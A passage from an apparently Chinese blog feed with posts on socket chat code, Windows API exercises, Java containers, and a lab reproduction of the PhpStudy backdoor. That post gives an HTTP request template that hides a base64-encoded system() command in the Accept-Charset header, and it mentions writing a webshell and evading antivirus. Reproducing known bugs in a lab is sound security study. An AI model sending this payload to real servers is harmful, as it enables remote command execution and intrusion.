class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>而服务端发消息只需要使用send函数即可，所以只要有用户提出通信请求，记录下该用户的唯一标识码和该用户想要通信的用户的唯一标识码，使用服务端的send函数可以实现服务端的转发。但是我还没有实现两个客户端之间可以随意所欲地发消息。如果想要随意所欲发消息，那么需要再创建两个线程，一个接收消息一个发送消息。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(b, information[a1].ReceiveBuff, <span class="built_in">strlen</span>(information[a1].ReceiveBuff), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><blockquote><p>因为只有单线程进行通信，但又要同时接受和发送，我只能利用一个变量的自增。（有时间我改成双线程），information[i].ReceiveBuff是某一个用户私有的缓冲区，i是该用户在用户的数据结构中所处的序号。客户端发起通信请求–&gt;服务端接收请求并转发消息至另一个客户端–&gt;另一个客户端收到请求。由此可实现客户端与客户端的通信。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (flagp % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">receiveuseranduser(a, a1);</span><br><span class="line">flagp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">receiveuseranduser(b, b1);</span><br><span class="line">flagp++;</span><br><span class="line">&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">receiveuseranduser</span><span class="params">(SOCKET sClient,<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line"><span class="comment">/*接收线程消息函数*/</span></span><br><span class="line">RetVal = recv(sClient, information[i].ReceiveBuff, MSGSIZE, <span class="number">0</span>);</span><br><span class="line">information[i].ReceiveBuff[RetVal] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>勉勉强强搭好了一个框，剩下的就是糊纸了。数据结构改一改就可以变成邮件管理系统什么的。</p><p>文件传输功能尚未完成，有时间就写（咕）。之后我会把优化版的代码贴上来，如果我想得起来的话。</p>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 套接字学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PhpStudy RCE漏洞复现</title>
      <link href="/2019/10/31/PhpStudy_RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/10/31/PhpStudy_RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="PhpStudy-RCE漏洞复现"><a href="#PhpStudy-RCE漏洞复现" class="headerlink" title="PhpStudy RCE漏洞复现"></a>PhpStudy RCE漏洞复现</h2><p>PhpStudy后门时间出现了挺长一阵子了，我一直没有进行复现，今天尝试复现一下。<br><a id="more"></a> </p><hr><h4 id="查看漏洞是否存在"><a href="#查看漏洞是否存在" class="headerlink" title="查看漏洞是否存在"></a>查看漏洞是否存在</h4><p>(1)phpStudy20161103版本后门位置存在位置</p><blockquote><p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p><p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p></blockquote><p>(2)phpStudy20180211后门位置存在于：</p><blockquote><p>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll</p><p>*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll</p></blockquote><p>查找dll文件中的”@eval”</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUC7V.png" alt="查找结果"></p><p>可见存在后门在169行</p><blockquote><p>顺便说一下，Windows的powershell无法使用grep，所以只能用Select-String进行替代。</p></blockquote><p>以下为PowerShell中可以替代grep的三种命令，but亲测findstr不能用。</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUo34.png" alt="findstr报错"></p><blockquote><p>findstr：           cat .\create.tf  |findstr alicloud_slb<br>where：            cat .\create.tf  |where {$_ -match “alicloud_slb”}<br>Select-String： Select-String “alicloud_slb” .\create.tf</p></blockquote><hr><h4 id="搭建PhpStudy靶机环境"><a href="#搭建PhpStudy靶机环境" class="headerlink" title="搭建PhpStudy靶机环境"></a>搭建PhpStudy靶机环境</h4><p>首先在靶机搭建phpstudy网站，在攻击机看是否可以访问</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUTgJ.png" alt="phpinfo"></p><h4 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h4><p>攻击机开启bp进行抓包</p><blockquote><p>GET / HTTP/1.1</p><p>Host: 192.168.179.1</p><p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0</p><p>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p><p>Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p><p>Accept-Encoding: gzip,deflate</p><p>Accept-Charset:”commandbase64 string”</p><p>Connection: close</p><p>Upgrade-Insecure-Requests: 1</p><p>Cache-Control: max-age=0</p></blockquote><p>出现RCE漏洞的地方即Accept-Charset参数</p><p>system(“your command”);</p><p>将想要执行的命令放到your command中，对整条命令进行base64编码，放入Accept-Charset即可执行命令。</p><p>我连接超时了，结果发现是php_xmlrpc拓展没开，并且一定要保留请求体，在Cache-Control后面一定要至少敲两行回车，要不会请求超时。</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUXE6.png" alt="结果"></p><p>然后直接一条龙，使用Phpstudy用户权限就是当前登陆用户权限，systeminfo看一波，netstat看一波端口，直接写webshell。(最近想再看看关于如何免杀，之前写的马msf12重编码依然被火绒拦……所以webshell这块之后再写)</p><p>之后顺便把后门删了(懒得搭windows虚拟机的我冒险用物理机以身试险)</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUzCD.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows API编程</title>
      <link href="/2019/10/30/Windows%20API%E7%BC%96%E7%A8%8B/"/>
      <url>/2019/10/30/Windows%20API%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows-API编程"><a href="#Windows-API编程" class="headerlink" title="Windows API编程"></a>Windows API编程</h2><blockquote><p>题目：使用 Windows 核心 API 实现以下程序 </p><ol><li>程序 1：该程序能够创建一个本机的 OllyDbg 进程（使用 CreateProcess，显式指定 OllyDbg 可执行文件的路径） </li><li>程序 2：<br>a) 该程序能够创建一个线程，显示 MessageBox<br>b) 在以上子线程中，编程获得 kernel32.dll 在当前系统中的路径信息，作为内容显示在以上的 MessageBox 中<br>c) 在以上子线程中，编程获得子线程所加载 kernel32.dll 中的GetCurrentThreadId()函数的地址，调用该函数，获得子线程的线程编号，将线程编号连接到上一问的 kernel32.dll路径后面，再将连接结果字符串显示在 MessageBox 中<a id="more"></a> </li></ol></blockquote><hr><p>以下程序我使用的是Dev-C++ “TDM-GCC 4.9.2 32-bit Release”编译成功的。</p><blockquote><p>程序1解决方案<br>此题明白CreateProcess的参数即可<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR commandLine[] = TEXT(<span class="string">"C:\\Users\\dell\\Desktop\\常用\\吾爱破解专用版Ollydbg\\原版\\英文原版\\OLLYDBG.EXE"</span>);</span><br><span class="line">    STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="keyword">bool</span> bRet = CreateProcess(</span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//应用程序名称，指向启动进程的 exe 文件 </span></span><br><span class="line">        commandLine,<span class="comment">//命令行字符串，是启动进程的命令行中的参数。</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//进程的安全属性 ，指向 SECURITY_ATTRIBUTES 结构变量，是进程的安全属性，可以为 NULL 则使用默认的安全属性</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//线程的安全属性 ，指向 SECURITY_ATTRIBUTES 结构变量。 </span></span><br><span class="line">        FALSE,<span class="comment">/*是否继承父进程属性 ，表示新进程是否从调用进程处继承了句柄。如果参数的值为 TRUE，调用进程中的每一个可继</span></span><br><span class="line"><span class="comment">承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限；如果设为 FALSE，那么不继承。 */</span> </span><br><span class="line">        CREATE_NO_WINDOW,<span class="comment">//创建标志，表示进程的创建标志以及优先级控制。 </span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//指向新的环境块的指针，指向新进程的环境变量块，如果设置为 NULL，那么使用父进程的环境变量。 </span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//指向当前目录名的指针 ，指定创建后新进程的当前目录，如果设置为 NULL，那么就在父进程所在的当前目录。 </span></span><br><span class="line">        &amp;si,<span class="comment">// 传递给新进程的信息，指向一个 STARTUPINFO 结构，该结构里可以设定启动信息，可以设置为 NULL 。</span></span><br><span class="line">        &amp;pi<span class="comment">//进程返回的信息，指向一个 PROCESS_INFORMATION 结构，返回被创建进程的信息。</span></span><br><span class="line">);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>程序2解决方案<br>学会调用Windows api即可（面向搜索引擎编程），我注释写的很详尽了<br>但是有一点投机取巧，我没有使用Windows api去搜索kernel32.dll路径，我是获取系统路径，如果是windows系统，那么kernel32.dll一定会在System32文件夹中。正确的做法应该还要再加一步确定kernel32.dll是否在System32文件夹中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getDllFuncAddr</span><span class="params">(<span class="keyword">char</span>* dllName, <span class="keyword">char</span>* funcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE h = LoadLibrary(dllName);</span><br><span class="line"><span class="keyword">long</span> addr = (<span class="keyword">long</span>)GetProcAddress(h, funcName);</span><br><span class="line">FreeLibrary(h);</span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Thread1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> address;</span><br><span class="line"><span class="keyword">int</span> number;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">10</span>]=<span class="string">"\0"</span>;</span><br><span class="line"><span class="keyword">char</span> path[MAX_PATH];</span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">"\\kernel32.dll;id="</span>; </span><br><span class="line"><span class="keyword">char</span> str1[] = <span class="string">"kernel32.dll"</span>;</span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"GetCurrentThreadId"</span>;</span><br><span class="line">    GetSystemDirectory(path,MAX_PATH);<span class="comment">/*获取当前系统路径*/</span></span><br><span class="line">    <span class="built_in">strcat</span>(path,name);<span class="comment">/*因为kernel32.dll一定在系统目录system32下，所以只需要获取system32路径即可*/</span></span><br><span class="line">address = getDllFuncAddr(str1, str2);<span class="comment">/*保存函数地址*/</span> </span><br><span class="line">number = ((<span class="keyword">long</span>(*)())address)();<span class="comment">/*把address强制转化为指针类型并用其调用函数*/</span> </span><br><span class="line">ltoa(number,str,<span class="number">10</span>); <span class="comment">/*把id号放入一个字符串*/</span> </span><br><span class="line"><span class="built_in">strcat</span>(path,str);<span class="comment">/*字符串连接*/</span> </span><br><span class="line">MessageBox ( <span class="literal">NULL</span>, TEXT (path), TEXT (<span class="string">"Win_prog"</span>), MB_OK ) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)Thread1,<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">HANDLE  CreateThread(</span></span><br><span class="line"><span class="comment">   LPSECURITY_ATTRIBUTES lpThreadAttributes, //线程安全性描述（一个结构体，一般是NULL）</span></span><br><span class="line"><span class="comment">   SIZE_T dwStackSize,                      //一种数值（栈深度，一般是0）   </span></span><br><span class="line"><span class="comment">   LPTHREAD_START_ROUTINE lpStartAddress,  //启动函数</span></span><br><span class="line"><span class="comment">   _In_opt_ __drv_aliasesMem LPVOID lpParameter, // 附加参数（一般为NULL）</span></span><br><span class="line"><span class="comment">    _In_ DWORD dwCreationFlags,          //运行参数（是否在创建完成后就启动线程</span></span><br><span class="line"><span class="comment">   _Out_opt_ LPDWORD lpThreadId   // 返回句柄（一般是0，或者是一个DWORD型变量的地址，别忘了&amp;）</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">/*防止主进程结束导致子线程被kill*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>参考资料：<br><strong> C语言 ( <em> ( void ( </em> ) ( ) ) 0 ) ( ) 的理解:<br><a href="https://blog.csdn.net/fengfeng0328/article/details/85949805" target="_blank" rel="noopener">https://blog.csdn.net/fengfeng0328/article/details/85949805</a> </strong><br><strong> 获取指定dll中的某个函数的地址:<br><a href="https://blog.csdn.net/leng_que/article/details/4668787" target="_blank" rel="noopener">https://blog.csdn.net/leng_que/article/details/4668787</a> </strong><br><strong> WindowsAPI使用详解——GetWindowsDirectory|GetSystemDirectory 获取操作系统文件夹的路径:<br><a href="https://www.cnblogs.com/callback/p/4248038.html" target="_blank" rel="noopener">https://www.cnblogs.com/callback/p/4248038.html</a> </strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-容器学习</title>
      <link href="/2019/10/28/Java-%E5%AE%B9%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/28/Java-%E5%AE%B9%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-容器学习"><a href="#Java-容器学习" class="headerlink" title="Java 容器学习"></a>Java 容器学习</h2><blockquote><p>容器，就是一种Java中的可以容纳各种对象的数据结构，容器可以储存各种对象：例如String、int都可以，如果不确定要让容器接受哪一种对象，可以使用泛型来替代。但是如果使用泛型，如果往容器里存Integer、String两种甚至更多种不同的对象，虽然编译器不会报错，但是会报出有安全问题警告，所以尽量还是直接指定存储哪一种对象，而非使用泛型。<br><a id="more"></a></p></blockquote><hr><blockquote><p>使用容器需要先import,容器都在java.uti中。<br>容器种类：<br>可以大概分为四种类型：List、Set、Map、迭代器等等。</p></blockquote><ul><li>列表（List）：</li></ul><p>定义：List<e>mylist = new ArrayList<e>();</e></e></p><ul><li>集合（Set）:</li></ul><p>定义：Set<integer>myset = new HashSet<integer>();<br>集合中不能有重复的元素</integer></integer></p><ul><li>映射（Map）</li></ul><p>定义：Map &lt;String,Integer&gt;keywords  = new HashMap&lt;String,Integer&gt;();<br>类似Python里面的字典，有键值对。</p><ul><li>迭代器</li></ul><p>定义：Iterator<string> it = actionSet.iterator();<br>使用迭代器可以方便的对容器里的内容进行遍历，因为容器不能通过下标等进行操作。</string></p><hr><blockquote><p>在JDK文档中查阅Stack接口，尝试用封装LinkedList的方式实现一个Stack容器<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">homework5_3</span>&lt;E&gt; <span class="title">extends</span> <span class="title">LinkedList</span>&lt;E&gt;&#123;</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;E&gt; LinkedListstack = <span class="keyword">new</span> LinkedList&lt;E&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(LinkedListstack.isEmpty())</span><br><span class="line"><span class="keyword">return</span> null;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> LinkedListstack.removeLast();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">LinkedListstack.addLast(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> boolean <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> LinkedListstack.isEmpty();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(isEmpty())&#123;</span><br><span class="line"><span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> LinkedListstack.getLast();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">homework5_3 <span class="built_in">stack</span> = <span class="keyword">new</span> homework5_3();</span><br><span class="line">System.out.println(<span class="string">"Push string \"test1\" \"test2\" to the Stack! "</span>);</span><br><span class="line"><span class="built_in">stack</span>.push(<span class="string">"test1"</span>);</span><br><span class="line"><span class="built_in">stack</span>.push(<span class="string">"test2"</span>);</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">System.out.println(<span class="string">"Start function Pop"</span>);</span><br><span class="line"><span class="built_in">stack</span>.pop();</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">System.out.println(<span class="string">"Start function Pop"</span>);</span><br><span class="line"><span class="built_in">stack</span>.pop();</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Push <span class="keyword">string</span> <span class="string">"test1"</span> <span class="string">"test2"</span> <span class="built_in">to</span> <span class="keyword">the</span> Stack!</span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">test2</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Pop</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">test1</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Pop</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">null</span></span></span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>使用LinkedList实现一个类，该类有一个方法，该方法接受一个字符串作为参数，依次读取字符串中的字符，每次遇到“+”号就将“+”后面的一个字符压入栈中，每次遇到“-”时就将当前栈顶的字符弹出并在控制台打印，直到字符串遍历完，最后输出栈上剩余内容。实现main（）方法调用这个方法，并输入字符串”+U+n+c—+e+r+t—+a=+i-+n+t+y—+-+r+u–+1+e+s—“，观察输出。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.lang.<span class="keyword">String</span>;</span><br><span class="line"><span class="keyword">public</span> class homework5_4&lt;E&gt; extends LinkedList&lt;E&gt;&#123;</span><br><span class="line">LinkedList&lt;<span class="keyword">String</span>&gt; stack = <span class="keyword">new</span> LinkedList&lt;<span class="keyword">String</span>&gt;();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> check(<span class="keyword">String</span> s)&#123;</span><br><span class="line"><span class="built_in">char</span> str1 = <span class="string">'+'</span>;</span><br><span class="line"><span class="built_in">char</span> str2 = <span class="string">'-'</span>;</span><br><span class="line"><span class="built_in">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line"><span class="built_in">char</span> item = s.charAt(i);</span><br><span class="line"><span class="keyword">if</span>(item == str1)&#123;</span><br><span class="line"><span class="built_in">int</span> p = i+<span class="number">1</span>;</span><br><span class="line">tmp = s.charAt(p);</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="keyword">String</span>.valueOf(tmp);</span><br><span class="line">stack.addLast(<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(item == str2)&#123;</span><br><span class="line">System.out.<span class="built_in">print</span>(stack.removeLast()+<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="string">"\nStack:"</span>);</span><br><span class="line"><span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">System.out.<span class="built_in">print</span>(stack.removeLast()+<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="string">"+U+n+c---+e+r+t---+a-+i-+n+t+y---+-+r+u--+1+e+s---"</span>;</span><br><span class="line">homework5_4 homework = <span class="keyword">new</span> homework5_4();</span><br><span class="line">homework.check(<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c <span class="built_in">n</span> U <span class="built_in">t</span> r e a i y <span class="built_in">t</span> <span class="built_in">n</span> - u r s e <span class="number">1</span></span><br><span class="line">Sta<span class="symbol">ck:</span></span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>学习第八章中的文件输入/输出方法，从例5-6的TestMap.java中读入语句，并进行词频统计。进一步改写程序，统计TestMap.java中的Java关键字出现频率，在统计时，创建一个Set存储所有的Java关键字，在判断一个字符串记号是否为关键字时访问该Set。<br>遇到的问题：<br>TestMap.java部分关键字识别不出来<br>解决：在某些关键字周围加上分隔符空格<br>TestMap.java<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> class TestMap&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">String</span>[] s=<span class="keyword">new</span> <span class="keyword">String</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">s[<span class="number">0</span>]=<span class="string">"I have a dream that one day this nation will rise up, "</span></span><br><span class="line">+ <span class="string">"live up to the true meaning of its creed: "</span></span><br><span class="line">+ <span class="string">"\"We hold these truths to be self-evident; "</span></span><br><span class="line">+ <span class="string">"that all men are created equal.\""</span>;</span><br><span class="line">s[<span class="number">1</span>]=<span class="string">"I have a dream that one day on the red hills of Georgia "</span></span><br><span class="line">+ <span class="string">"the sons of former slaves and the sons of former slave-owners "</span></span><br><span class="line">+ <span class="string">"will be able to sit down together at the table of brotherhood."</span>;</span><br><span class="line">s[<span class="number">2</span>]=<span class="string">"I have a dream that one day even the state of Mississippi, "</span></span><br><span class="line">+ <span class="string">"a state sweltering with the heat of injustice, "</span></span><br><span class="line">+ <span class="string">"sweltering with the heat of oppression, "</span></span><br><span class="line">+ <span class="string">"will be transformed into an oasis of 